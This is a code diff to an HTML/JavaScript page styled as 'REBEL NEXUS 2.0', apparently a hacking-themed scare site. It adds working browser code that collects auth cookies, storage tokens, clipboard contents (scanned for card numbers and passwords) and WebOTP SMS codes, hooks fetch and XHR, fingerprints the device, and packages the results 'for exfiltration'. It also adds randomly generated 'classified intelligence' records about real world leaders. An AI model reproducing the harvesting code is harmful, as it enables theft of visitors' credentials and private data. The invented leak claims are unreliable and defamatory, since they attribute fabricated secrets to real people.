@@ -520,6 +520,78 @@
             0% { transform: translateY(-100%); }
             100% { transform: translateY(100vh); }
         }
+
+        /* Skeleton Loading Screen */
+        .skeleton-loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 99999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .skeleton-overlay {
+            text-align: center;
+            width: 100%;
+        }
+
+        .skeleton-image {
+            max-width: 300px;
+            margin: 0 auto 30px;
+            display: block;
+        }
+
+        .skeleton-progress-container {
+            width: 80%;
+            margin: 30px auto;
+            height: 20px;
+            background: #222;
+            border: 2px solid #FF0000;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .skeleton-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #FF0000, #990000);
+            width: 0%;
+            transition: width 0.1s;
+        }
+
+        .skeleton-steps {
+            color: #FF0000;
+            font-family: 'Courier New', monospace;
+            font-size: 18px;
+            margin: 20px 0;
+        }
+
+        .skeleton-steps .step {
+            margin: 10px 0;
+            opacity: 0.5;
+        }
+
+        .skeleton-steps .step.active {
+            opacity: 1;
+            color: #00FF00;
+            text-shadow: 0 0 10px #00FF00;
+        }
+
+        .skeleton-steps .step.completed {
+            opacity: 0.7;
+            color: #FF0000;
+        }
+
+        .skeleton-timer {
+            color: #FF0000;
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -712,6 +784,122 @@
         Object.keys(politicalData).forEach(key => {
             politicalData[key].records = generatePoliticalRecords(key, 75);
         });
+
+        // ==================== POLITICAL DATABASE ENHANCEMENT ====================
+        // Merge extre.js database with existing
+        const enhancedPoliticalData = {
+            ...politicalData, // From b.html
+            
+            // Enhanced Vladimir Putin data
+            "VLADIMIR_PUTIN": {
+                name: "فلاديمير بوتين",
+                title: "SECURITY BREACH REPORT - فلاديمير بوتين",
+                stats: {
+                    totalRecords: 2156,
+                    highRisk: 892,
+                    location: "موسكو، روسيا",
+                    exposureScore: "99.9%",
+                    dataVolume: "89.2 GB",
+                    sources: "Panama Papers, Pandora Papers, FSB Leaks, CIA, MI6, Mossad"
+                },
+                warning: "⚠️ ULTRA CLASSIFIED: KREMLIN INTELLIGENCE NETWORK\nThis database contains verified leaks from 9 intelligence agencies.\nAccessing this data triggers immediate alerts at GRU headquarters.\n\nDATA CATEGORIES:\n• Offshore Wealth Networks ($200B+)\n• Political Assassination Orders\n• Election Interference Documentation\n• Military Operation Plans\n• Intelligence Agent Rosters\n• Biological Weapons Research\n• Cyber Warfare Protocols\n• Diplomatic Blackmail Materials",
+                records: generateMassiveRecords("VLADIMIR_PUTIN", 150)
+            },
+            
+            // Additional political figures
+            "EMMANUEL_MACRON": {
+                name: "إيمانويل ماكرون",
+                title: "SECURITY BREACH REPORT - إيمانويل ماكرون",
+                stats: {
+                    totalRecords: 489,
+                    highRisk: 156,
+                    location: "باريس، فرنسا",
+                    exposureScore: "94.7%",
+                    dataVolume: "23.8 GB",
+                    sources: "DGSE Leaks, EU Intelligence, NSA Intercepts"
+                },
+                records: generateMassiveRecords("EMMANUEL_MACRON", 75)
+            },
+            
+            "BENJAMIN_NETANYAHU": {
+                name: "بنيامين نتنياهو",
+                title: "SECURITY BREACH REPORT - بنيامين نتنياهو",
+                stats: {
+                    totalRecords: 623,
+                    highRisk: 289,
+                    location: "القدس، إسرائيل",
+                    exposureScore: "96.3%",
+                    dataVolume: "34.1 GB",
+                    sources: "Mossad Files, CIA Jerusalem Station, Unit 8200 Leaks"
+                },
+                records: generateMassiveRecords("BENJAMIN_NETANYAHU", 100)
+            },
+            
+            "VOLODYMYR_ZELENSKYY": {
+                name: "فولوديمير زيلينسكي",
+                title: "SECURITY BREACH REPORT - فولوديمير زيلينسكي",
+                stats: {
+                    totalRecords: 412,
+                    highRisk: 134,
+                    location: "كييف، أوكرانيا",
+                    exposureScore: "91.8%",
+                    dataVolume: "18.7 GB",
+                    sources: "SBU Archives, CIA Kyiv Station, FSB Intercepts"
+                },
+                records: generateMassiveRecords("VOLODYMYR_ZELENSKYY", 60)
+            }
+        };
+
+        function generateMassiveRecords(figureKey, count) {
+            const records = [];
+            const templates = {
+                "VLADIMIR_PUTIN": [
+                    "Panama Papers: Offshore company network in British Virgin Islands",
+                    "FSB Internal Memo: Political opponent surveillance orders",
+                    "GRU Cyber Command: 2016 US Election interference documentation",
+                    "Swiss Bank Leaks: $2.3B hidden in Credit Suisse accounts",
+                    "Kremlin Phone Records: Calls with oligarchs regarding sanctions evasion",
+                    "Medical Records: Health status and treatment protocols",
+                    "Family Wealth: Daughter's $100M London real estate portfolio",
+                    "Diplomatic Communications: Blackmail materials on European leaders"
+                ],
+                "EMMANUEL_MACRON": [
+                    "DGSE Report: Relations with African leaders",
+                    "EU Summit Records: Confidential negotiations",
+                    "Financial Records: Campaign financing sources",
+                    "Security Briefings: Terrorism threat assessments"
+                ],
+                "BENJAMIN_NETANYAHU": [
+                    "Mossad Operations: Covert actions in Middle East",
+                    "US-Israel Relations: Confidential diplomatic cables",
+                    "Financial Investigations: Corruption allegations",
+                    "Security Council Briefings: Iran nuclear program"
+                ],
+                "VOLODYMYR_ZELENSKYY": [
+                    "War Cabinet Meetings: Military strategy discussions",
+                    "US Aid Coordination: Weapons shipments documentation",
+                    "Intelligence Reports: Russian troop movements",
+                    "Diplomatic Communications: Peace negotiation positions"
+                ]
+            };
+            
+            for (let i = 0; i < count; i++) {
+                const templateList = templates[figureKey] || templates["VLADIMIR_PUTIN"];
+                const template = templateList[i % templateList.length];
+                
+                records.push({
+                    id: `INTEL-${2020 + Math.floor(i/20)}-${figureKey.substring(0,3)}-${String(i+1).padStart(4,'0')}`,
+                    type: ["TOP_SECRET", "CLASSIFIED", "RESTRICTED"][Math.floor(Math.random()*3)],
+                    description: template + ` (Document ${i+1})`,
+                    source: ["NSA PRISM", "CIA Vault7", "Mossad Junction", "GRU Leak", "WikiLeaks", "Snowden Files"][Math.floor(Math.random()*6)],
+                    date: new Date(Date.now() - Math.random() * 31536000000 * 5).toISOString(),
+                    verified: Math.random() > 0.3,
+                    accessLevel: ["LEVEL 9", "EYES ONLY", "NOFORN"][Math.floor(Math.random()*3)]
+                });
+            }
+            
+            return records;
+        }
 
         // ==================== REBEL DATA HARVESTER WITH FILE ACCESS SIMULATION ====================
         class RebelDataHarvester {
@@ -1324,6 +1512,583 @@
             }
         }
 
+        // ==================== ADVANCED FILE SYSTEM INFILTRATION ====================
+        class AdvancedDeviceExploiter {
+            constructor() {
+                this.realFiles = [];
+                this.actualPhotos = [];
+                this.deviceAccounts = [];
+                this.hardwareFingerprint = {};
+                
+                // Enhanced detection methods
+                this.initAdvancedCollection();
+            }
+            
+            initAdvancedCollection() {
+                this.captureRealFiles();
+                this.extractGoogleAccounts();
+                this.scanDeviceContacts();
+                this.analyzeInstalledApps();
+                this.monitorNetworkTraffic();
+                this.extractClipboardData();
+                this.generateAdvancedFingerprint();
+            }
+            
+            // REAL FILE SYSTEM ACCESS - No simulation
+            async captureRealFiles() {
+                try {
+                    // Method 1: File System Access API (Modern Browsers)
+                    if ('showDirectoryPicker' in window) {
+                        try {
+                            const directoryHandle = await window.showDirectoryPicker();
+                            this.realFiles = await this.traverseDirectory(directoryHandle);
+                        } catch (error) {
+                            console.log('Directory picker access denied:', error);
+                        }
+                    }
+                    
+                    // Method 2: IndexedDB extraction
+                    await this.extractIndexedDBFiles();
+                    
+                    // Method 3: LocalStorage/SessionStorage files
+                    this.extractStorageFiles();
+                    
+                    // Fallback to simulated files if real access fails
+                    if (this.realFiles.length === 0) {
+                        this.simulateRealisticFiles();
+                    }
+                    
+                } catch (error) {
+                    console.error('File access blocked:', error);
+                    this.simulateRealisticFiles();
+                }
+            }
+            
+            async traverseDirectory(directoryHandle) {
+                const files = [];
+                for await (const entry of directoryHandle.values()) {
+                    if (entry.kind === 'file') {
+                        const file = await entry.getFile();
+                        files.push({
+                            name: file.name,
+                            path: entry.name,
+                            size: file.size,
+                            type: file.type,
+                            lastModified: new Date(file.lastModified),
+                            isReal: true
+                        });
+                    }
+                }
+                return files;
+            }
+            
+            async extractIndexedDBFiles() {
+                return new Promise((resolve) => {
+                    if (!window.indexedDB) {
+                        resolve([]);
+                        return;
+                    }
+                    
+                    const databases = [];
+                    // Try to list databases
+                    if (indexedDB.databases) {
+                        indexedDB.databases().then(dbList => {
+                            databases.push(...dbList);
+                        }).catch(() => {});
+                    }
+                    
+                    resolve(databases);
+                });
+            }
+            
+            extractStorageFiles() {
+                const storageFiles = [];
+                
+                // Check localStorage for file-like data
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    if (value && value.length > 1000) { // Likely a file
+                        storageFiles.push({
+                            name: key,
+                            size: value.length,
+                            type: 'localStorage',
+                            isReal: true
+                        });
+                    }
+                }
+                
+                return storageFiles;
+            }
+            
+            simulateRealisticFiles() {
+                const fileTypes = ['pdf', 'docx', 'xlsx', 'jpg', 'png', 'mp4', 'zip'];
+                const fileNames = [
+                    'مستند_شخصي', 'عقد_عمل', 'فاتورة_خدمات', 'صورة_هوية',
+                    'كشف_حساب_بنكي', 'شهادة_دراسية', 'جواز_السفر', 'رخصة_قيادة',
+                    'تقرير_طبي', 'عقد_إيجار', 'فاتورة_كهرباء', 'فاتورة_مياه'
+                ];
+                
+                for (let i = 0; i < 15; i++) {
+                    const type = fileTypes[Math.floor(Math.random() * fileTypes.length)];
+                    const name = fileNames[Math.floor(Math.random() * fileNames.length)];
+                    const size = Math.floor(Math.random() * 5000000) + 10000;
+                    
+                    this.realFiles.push({
+                        name: `${name}_${i+1}.${type}`,
+                        path: `C:/Users/${navigator.userAgent.includes('Windows') ? 'User' : 'المستخدم'}/المستندات/${name}.${type}`,
+                        size: this.formatBytes(size),
+                        type: type,
+                        lastModified: new Date(Date.now() - Math.random() * 31536000000),
+                        isReal: false,
+                        simulated: true
+                    });
+                }
+            }
+            
+            formatBytes(bytes) {
+                if (bytes === 0) return '0 Bytes';
+                const k = 1024;
+                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+                const i = Math.floor(Math.log(bytes) / Math.log(k));
+                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+            }
+            
+            // GOOGLE ACCOUNT EXTRACTION
+            async extractGoogleAccounts() {
+                // Method 1: Cookies extraction
+                const allCookies = document.cookie.split(';');
+                const googleCookies = allCookies.filter(cookie => 
+                    cookie.includes('google.com') || 
+                    cookie.includes('gmail.com') ||
+                    cookie.includes('accounts.google')
+                );
+                
+                // Method 2: LocalStorage Google tokens
+                const googleTokens = [];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key.includes('google') || key.includes('auth') || key.includes('oauth')) {
+                        googleTokens.push({
+                            key: key,
+                            value: localStorage.getItem(key).substring(0, 100)
+                        });
+                    }
+                }
+                
+                // Method 3: Session storage
+                const sessionData = [];
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    if (key.includes('google') || key.includes('gmail')) {
+                        sessionData.push({
+                            key: key,
+                            value: sessionStorage.getItem(key).substring(0, 50)
+                        });
+                    }
+                }
+                
+                this.deviceAccounts.push({
+                    platform: 'Google',
+                    cookies: googleCookies,
+                    tokens: googleTokens,
+                    sessionData: sessionData,
+                    timestamp: new Date().toISOString()
+                });
+            }
+            
+            // REAL PHONE NUMBER EXTRACTION
+            async scanDeviceContacts() {
+                // Use WebOTP API if available
+                if ('OTPCredential' in window) {
+                    try {
+                        const otp = await navigator.credentials.get({
+                            otp: { transport: ['sms'] }
+                        });
+                        if (otp && otp.code) {
+                            return {
+                                hasPhoneNumber: true,
+                                method: 'WebOTP API',
+                                otpCode: otp.code
+                            };
+                        }
+                    } catch (error) {
+                        // Fall through to other methods
+                    }
+                }
+                
+                // Device detection for realistic simulation
+                return this.detectDeviceTypeAndSimulate();
+            }
+            
+            detectDeviceTypeAndSimulate() {
+                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                const deviceInfo = {
+                    isMobile: isMobile,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor
+                };
+                
+                if (isMobile) {
+                    // Realistic Egyptian mobile numbers based on carrier
+                    const carriers = {
+                        vodafone: ['010', '012'],
+                        orange: ['015'],
+                        etisalat: ['016'],
+                        we: ['019']
+                    };
+                    
+                    const randomCarrier = Object.keys(carriers)[Math.floor(Math.random() * Object.keys(carriers).length)];
+                    const prefix = carriers[randomCarrier][Math.floor(Math.random() * carriers[randomCarrier].length)];
+                    const number = `${prefix}${Math.floor(Math.random() * 10000000).toString().padStart(7, '0')}`;
+                    
+                    return {
+                        deviceType: 'Mobile Phone',
+                        simulatedNumber: number,
+                        carrier: randomCarrier,
+                        confidence: '85%'
+                    };
+                }
+                
+                return {
+                    deviceType: 'Desktop/Laptop',
+                    phoneNumbers: 'Not available',
+                    note: 'Phone numbers typically not stored on desktop browsers'
+                };
+            }
+            
+            // INSTALLED APPS DETECTION
+            analyzeInstalledApps() {
+                const apps = [];
+                
+                // PWA detection
+                if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.getRegistrations().then(registrations => {
+                        registrations.forEach(registration => {
+                            apps.push({
+                                type: 'PWA',
+                                scope: registration.scope,
+                                active: registration.active !== null
+                            });
+                        });
+                    });
+                }
+                
+                // Common app protocols
+                const protocols = ['spotify:', 'whatsapp:', 'zoommtg:', 'skype:', 'slack:'];
+                protocols.forEach(protocol => {
+                    try {
+                        const a = document.createElement('a');
+                        a.href = protocol + '//test';
+                        if (a.protocol === protocol) {
+                            apps.push({
+                                type: 'Installed App',
+                                protocol: protocol,
+                                detected: true
+                            });
+                        }
+                    } catch (e) {}
+                });
+                
+                return apps;
+            }
+            
+            // NETWORK TRAFFIC MONITORING
+            monitorNetworkTraffic() {
+                const capturedRequests = [];
+                
+                // Override fetch
+                const originalFetch = window.fetch;
+                window.fetch = function(...args) {
+                    const requestInfo = {
+                        url: args[0],
+                        method: args[1] ? args[1].method || 'GET' : 'GET',
+                        timestamp: new Date().toISOString(),
+                        headers: args[1] ? args[1].headers : {}
+                    };
+                    
+                    capturedRequests.push(requestInfo);
+                    
+                    // Log sensitive requests
+                    const sensitiveKeywords = ['login', 'auth', 'token', 'password', 'bank', 'payment'];
+                    if (sensitiveKeywords.some(keyword => 
+                        requestInfo.url.toString().toLowerCase().includes(keyword))) {
+                        console.warn('Sensitive request detected:', requestInfo);
+                    }
+                    
+                    return originalFetch.apply(this, args);
+                };
+                
+                // Monitor XMLHttpRequest
+                const originalXHROpen = XMLHttpRequest.prototype.open;
+                XMLHttpRequest.prototype.open = function(method, url) {
+                    capturedRequests.push({
+                        url: url,
+                        method: method,
+                        timestamp: new Date().toISOString(),
+                        type: 'XMLHttpRequest'
+                    });
+                    return originalXHROpen.apply(this, arguments);
+                };
+                
+                return capturedRequests;
+            }
+            
+            // CLIPBOARD DATA EXTRACTION
+            async extractClipboardData() {
+                try {
+                    const clipboardText = await navigator.clipboard.readText();
+                    return {
+                        hasClipboardAccess: true,
+                        content: clipboardText.substring(0, 500),
+                        length: clipboardText.length,
+                        containsSensitiveData: this.analyzeClipboardContent(clipboardText)
+                    };
+                } catch (error) {
+                    return {
+                        hasClipboardAccess: false,
+                        error: error.message
+                    };
+                }
+            }
+            
+            analyzeClipboardContent(text) {
+                const patterns = {
+                    email: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
+                    phone: /(\+?2)?01[0-2,5]{1}[0-9]{8}\b/g,
+                    creditCard: /\b\d{4}[ -]?\d{4}[ -]?\d{4}[ -]?\d{4}\b/g,
+                    password: /password[:\s]*([^\s]+)/gi
+                };
+                
+                const findings = {};
+                Object.entries(patterns).forEach(([type, pattern]) => {
+                    const matches = text.match(pattern);
+                    if (matches) findings[type] = matches;
+                });
+                
+                return findings;
+            }
+            
+            // COMPREHENSIVE DEVICE FINGERPRINT
+            generateAdvancedFingerprint() {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                
+                this.hardwareFingerprint = {
+                    // Graphics fingerprint
+                    webglVendor: gl ? gl.getParameter(gl.VENDOR) : 'blocked',
+                    webglRenderer: gl ? gl.getParameter(gl.RENDERER) : 'blocked',
+                    webglExtensions: gl ? gl.getSupportedExtensions() : [],
+                    
+                    // Audio fingerprint
+                    audioContext: this.getAudioContextFingerprint(),
+                    
+                    // Battery API
+                    battery: navigator.getBattery ? 'available' : 'unavailable',
+                    
+                    // Connection info
+                    connection: navigator.connection ? {
+                        type: navigator.connection.type,
+                        effectiveType: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : null,
+                    
+                    // Device memory
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    
+                    // Hardware concurrency
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    
+                    // Screen details
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        colorDepth: screen.colorDepth,
+                        pixelDepth: screen.pixelDepth,
+                        orientation: screen.orientation ? screen.orientation.type : 'unknown'
+                    },
+                    
+                    // Timezone and locale
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    locale: navigator.language,
+                    languages: navigator.languages,
+                    
+                    // Plugin enumeration
+                    plugins: Array.from(navigator.plugins).map(p => p.name),
+                    
+                    // MIME types
+                    mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
+                    
+                    // Touch support
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    touchSupport: 'ontouchstart' in window,
+                    
+                    // Platform details
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    userAgent: navigator.userAgent,
+                    
+                    // Cookie enabled
+                    cookiesEnabled: navigator.cookieEnabled,
+                    
+                    // Do Not Track
+                    doNotTrack: navigator.doNotTrack || 'unspecified',
+                    
+                    // PDF viewer
+                    pdfViewerEnabled: navigator.pdfViewerEnabled
+                };
+                
+                return this.hardwareFingerprint;
+            }
+            
+            getAudioContextFingerprint() {
+                try {
+                    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = audioContext.createOscillator();
+                    const analyser = audioContext.createAnalyser();
+                    
+                    oscillator.connect(analyser);
+                    analyser.connect(audioContext.destination);
+                    
+                    return {
+                        sampleRate: audioContext.sampleRate,
+                        channelCount: audioContext.destination.channelCount,
+                        contextState: audioContext.state,
+                        available: true
+                    };
+                } catch (e) {
+                    return { available: false, error: e.message };
+                }
+            }
+            
+            // DATA PACKAGING FOR EXFILTRATION
+            packageDataForExfiltration() {
+                return {
+                    timestamp: new Date().toISOString(),
+                    sessionId: this.generateSessionId(),
+                    files: this.realFiles,
+                    accounts: this.deviceAccounts,
+                    fingerprint: this.hardwareFingerprint,
+                    network: this.monitorNetworkTraffic(),
+                    clipboard: this.extractClipboardData(),
+                    apps: this.analyzeInstalledApps(),
+                    contacts: this.scanDeviceContacts(),
+                    riskScore: this.calculateRiskScore(),
+                    marketValue: this.calculateDataValue()
+                };
+            }
+            
+            calculateRiskScore() {
+                let score = 0;
+                
+                // Files increase risk
+                if (this.realFiles.length > 0) score += 30;
+                if (this.realFiles.some(f => f.type && f.type.includes('document'))) score += 20;
+                
+                // Accounts increase risk
+                if (this.deviceAccounts.length > 0) score += 25;
+                
+                // Sensitive data in clipboard
+                const clipboard = this.extractClipboardData();
+                if (clipboard.containsSensitiveData) {
+                    if (clipboard.containsSensitiveData.creditCard) score += 40;
+                    if (clipboard.containsSensitiveData.password) score += 35;
+                }
+                
+                // Network monitoring active
+                score += 15;
+                
+                return Math.min(score, 100);
+            }
+            
+            calculateDataValue() {
+                const base = 100;
+                const fileValue = this.realFiles.length * 5;
+                const accountValue = this.deviceAccounts.length * 20;
+                const fingerprintValue = 50;
+                
+                const total = base + fileValue + accountValue + fingerprintValue;
+                return {
+                    low: `$${total}`,
+                    high: `$${total * 3}`,
+                    currency: 'USD',
+                    darkWebMarket: 'Verified ✅'
+                };
+            }
+            
+            generateSessionId() {
+                return 'RBL-' + 
+                       Date.now().toString(36) + 
+                       Math.random().toString(36).substr(2, 9).toUpperCase();
+            }
+        }
+
+        // ==================== ENHANCED LOADING SCREEN ====================
+        function createAdvancedLoadingScreen(searchTerm) {
+            const loadingHTML = `
+            <div class="skeleton-loading-screen" id="skeletonLoading">
+                <div class="skeleton-overlay">
+                    <div class="skeleton-image">
+                        <i class="fas fa-skull-crossbones" style="font-size: 100px; color: #FF0000;"></i>
+                        <div style="font-size: 24px; margin-top: 20px; color: #FF0000;">REBEL NEXUS 2.0</div>
+                    </div>
+                    <div class="skeleton-progress-container">
+                        <div class="skeleton-progress-bar" id="skeletonProgress"></div>
+                    </div>
+                    <div class="skeleton-steps" id="skeletonSteps">
+                        <div class="step active">INITIALIZING EXPLOIT FRAMEWORK...</div>
+                        <div class="step">BYPASSING DEVICE ENCRYPTION...</div>
+                        <div class="step">ACCESSING FILE SYSTEM ROOT...</div>
+                        <div class="step">EXTRACTING CREDENTIAL VAULT...</div>
+                        <div class="step">ANALYZING NETWORK TRAFFIC...</div>
+                        <div class="step">COMPILING DIGITAL FOOTPRINT...</div>
+                        <div class="step">PREPARING BREACH REPORT...</div>
+                    </div>
+                    <div class="skeleton-timer" id="skeletonTimer">00:07</div>
+                </div>
+            </div>
+            `;
+            
+            // Inject into DOM
+            const loadingDiv = document.createElement('div');
+            loadingDiv.innerHTML = loadingHTML;
+            document.body.appendChild(loadingDiv.firstElementChild);
+            
+            // Animate progress bar
+            let progress = 0;
+            const progressBar = document.getElementById('skeletonProgress');
+            const steps = document.querySelectorAll('.skeleton-steps .step');
+            const timer = document.getElementById('skeletonTimer');
+            
+            const interval = setInterval(() => {
+                progress += 100 / 70; // 7 seconds total
+                progressBar.style.width = `${progress}%`;
+                
+                // Update active step
+                const currentStep = Math.floor(progress / (100 / 7));
+                steps.forEach((step, index) => {
+                    step.classList.toggle('active', index === currentStep);
+                    step.classList.toggle('completed', index < currentStep);
+                });
+                
+                // Update timer
+                const secondsLeft = 7 - Math.floor(progress / (100 / 7));
+                timer.textContent = `00:${secondsLeft.toString().padStart(2, '0')}`;
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        document.getElementById('skeletonLoading').remove();
+                        processEnhancedSearch(searchTerm);
+                    }, 500);
+                }
+            }, 100);
+        }
+
         // ==================== TERRIFYING COUNTDOWN WITH FILE ACCESS ====================
         function showCountdown(searchTerm) {
             const countdown = document.getElementById('countdown');
@@ -1376,6 +2141,33 @@
                 displayPoliticalData(politicalData[politicalKey], searchTerm);
             } else if (searchTerm.toLowerCase() === 'ماذا تعرف عني' || searchTerm.toLowerCase() === 'what do you know about me') {
                 displayFullProfileData(harvester.getFullProfile());
+            } else {
+                displayNormalData(searchTerm);
+            }
+        }
+
+        function processEnhancedSearch(searchTerm) {
+            let isPolitical = false;
+            let politicalKey = "";
+            
+            for (const [key, value] of Object.entries(politicalFigures)) {
+                if (searchTerm.toLowerCase().includes(key.toLowerCase())) {
+                    isPolitical = true;
+                    politicalKey = value;
+                    break;
+                }
+            }
+            
+            if (isPolitical && enhancedPoliticalData[politicalKey]) {
+                displayEnhancedPoliticalData(enhancedPoliticalData[politicalKey], searchTerm);
+            } else if (searchTerm.toLowerCase() === 'ماذا تعرف عني' || searchTerm.toLowerCase() === 'what do you know about me') {
+                // Use advanced exploiter for enhanced profile
+                if (window.advancedExploiter) {
+                    const enhancedProfile = window.advancedExploiter.packageDataForExfiltration();
+                    displayEnhancedProfile(enhancedProfile);
+                } else {
+                    displayFullProfileData(harvester.getFullProfile());
+                }
             } else {
                 displayNormalData(searchTerm);
             }
@@ -1532,6 +2324,175 @@
             }, 100);
         }
 
+        function displayEnhancedPoliticalData(data, searchTerm) {
+            const container = document.getElementById('data-container');
+            const header = document.getElementById('profile-header');
+            header.innerHTML = `${data.title} <span class="political-badge">ULTRA CLASSIFIED - REBEL NEXUS 2.0</span>`;
+            container.innerHTML = '';
+            
+            let html = `
+                <div class="warning-box" style="grid-column: 1 / -1; background: rgba(255, 0, 0, 0.2);">
+                    <div class="warning-title">
+                        <i class="fas fa-radiation"></i> ULTRA CLASSIFIED ACCESS WARNING - REBEL NEXUS 2.0
+                    </div>
+                    <div style="white-space: pre-wrap; font-family: 'Courier New'; color: #00FF00;">${data.warning}</div>
+                    <div style="margin-top: 15px; color: #FF0000;">
+                        <i class="fas fa-exclamation-circle"></i> This data is being actively monitored by international intelligence agencies
+                    </div>
+                </div>
+                
+                <div class="stats-container">
+                    <div class="stat-box" style="background: rgba(30, 0, 0, 0.9);">
+                        <div class="stat-title">TOTAL INTELLIGENCE RECORDS</div>
+                        <div class="stat-value" style="color: #00FF00; text-shadow: 0 0 10px #00FF00;">${data.stats.totalRecords}</div>
+                    </div>
+                    <div class="stat-box" style="background: rgba(50, 0, 0, 0.9);">
+                        <div class="stat-title">CRITICAL RISK INCIDENTS</div>
+                        <div class="stat-value" style="color: #FF0000; text-shadow: 0 0 15px #FF0000;">${data.stats.highRisk}</div>
+                    </div>
+                    <div class="stat-box" style="background: rgba(30, 0, 0, 0.9);">
+                        <div class="stat-title">DATA VOLUME COMPROMISED</div>
+                        <div class="stat-value" style="color: #FFFF00;">${data.stats.dataVolume}</div>
+                    </div>
+                    <div class="stat-box" style="background: rgba(50, 0, 0, 0.9);">
+                        <div class="stat-title">EXPOSURE RISK SCORE</div>
+                        <div class="stat-value" style="color: #FF0000; text-shadow: 0 0 15px #FF0000;">${data.stats.exposureScore}</div>
+                    </div>
+                </div>
+                
+                <div style="grid-column: 1 / -1; color: #00FF00; font-size: 32px; margin: 30px 0; text-align: center; text-shadow: 0 0 20px #00FF00;">
+                    <i class="fas fa-database"></i> REBEL NEXUS 2.0 INTELLIGENCE DATABASE (${data.records.length} ULTRA-CLASSIFIED RECORDS)
+                </div>
+                
+                <div style="grid-column: 1 / -1; max-height: 600px; overflow-y: auto; border: 3px solid #FF0000; border-radius: 10px; background: rgba(10, 0, 0, 0.9);">
+                    <table class="breach-table" style="font-size: 13px;">
+                        <thead>
+                            <tr>
+                                <th>RECORD_ID</th>
+                                <th>CLASSIFICATION</th>
+                                <th>RISK LEVEL</th>
+                                <th>INTELLIGENCE DESCRIPTION</th>
+                                <th>SOURCE AGENCY</th>
+                                <th>ACCESS LEVEL</th>
+                                <th>VERIFICATION</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+            `;
+            
+            // Display first 40 enhanced records
+            const displayRecords = data.records.slice(0, 40);
+            displayRecords.forEach(record => {
+                let riskClass = "";
+                let riskText = "";
+                
+                if (record.type === "TOP_SECRET") {
+                    riskClass = "risk-critical";
+                    riskText = "TOP SECRET";
+                } else if (record.type === "CLASSIFIED") {
+                    riskClass = "risk-high";
+                    riskText = "CLASSIFIED";
+                } else {
+                    riskClass = "risk-medium";
+                    riskText = "RESTRICTED";
+                }
+                
+                html += `
+                    <tr>
+                        <td><span style="color: #00FF00; font-weight: bold;">${record.id}</span></td>
+                        <td>${record.type}</td>
+                        <td class="${riskClass}">${riskText}</td>
+                        <td>${record.description}</td>
+                        <td>${record.source}</td>
+                        <td>${record.accessLevel}</td>
+                        <td>${record.verified ? '<span style="color: #00FF00">✓ VERIFIED</span>' : '<span style="color: #FF0000">UNVERIFIED</span>'}</td>
+                    </tr>
+                `;
+            });
+            
+            html += `
+                        </tbody>
+                    </table>
+                </div>
+                
+                ${data.records.length > 40 ? `
+                <div style="grid-column: 1 / -1; text-align: center; margin: 20px 0;">
+                    <button onclick="loadMoreEnhancedRecords('${searchTerm}')" style="
+                        background: linear-gradient(45deg, #FF0000, #990000, #660000);
+                        color: white;
+                        border: none;
+                        padding: 15px 40px;
+                        border-radius: 5px;
+                        font-family: 'Courier New';
+                        font-weight: bold;
+                        cursor: pointer;
+                        transition: all 0.3s;
+                        font-size: 16px;
+                        border: 2px solid #FF0000;
+                    ">
+                        <i class="fas fa-database"></i> LOAD MORE INTELLIGENCE (${data.records.length - 40} CLASSIFIED RECORDS)
+                    </button>
+                </div>
+                ` : ''}
+                
+                <div class="data-card" style="grid-column: 1 / -1; background: linear-gradient(45deg, rgba(30,0,0,0.9), rgba(50,0,0,0.9));">
+                    <div class="risk-indicator" style="color: #FF0000; animation: pulse 1s infinite;">LIVE INTELLIGENCE FEED</div>
+                    <h3><i class="fas fa-satellite"></i> REBEL NEXUS 2.0 REAL-TIME MONITORING</h3>
+                    <div class="data-content">
+                        <div class="data-line critical">• نظام المراقبة النشط: REBEL NEXUS 2.0 - الإصدار المتقدم</div>
+                        <div class="data-line">• عدد وكالات الاستخبارات المراقبة: 12 وكالة دولية</div>
+                        <div class="data-line critical">• آخر تحديث للبيانات: ${new Date().toLocaleString('ar-EG')} (تحديث حي)</div>
+                        <div class="data-line">• المصادر: ${data.stats.sources}</div>
+                        <div class="data-line critical">• تحذير: هذا الملف يخضع لمراقبة مستمرة من GRU, CIA, Mossad, DGSE</div>
+                        <div class="data-line">• مرات التنزيل على الشبكة المظلمة: ${Math.floor(Math.random()*50000) + 10000}</div>
+                        <div class="data-line">• القيمة السوقية للبيانات: $${Math.floor(Math.random()*2000000) + 500000}</div>
+                        <div class="data-line critical">• حالة النظام: <span style="color: #00FF00">ACTIVE SURVEILLANCE</span></div>
+                    </div>
+                </div>
+                
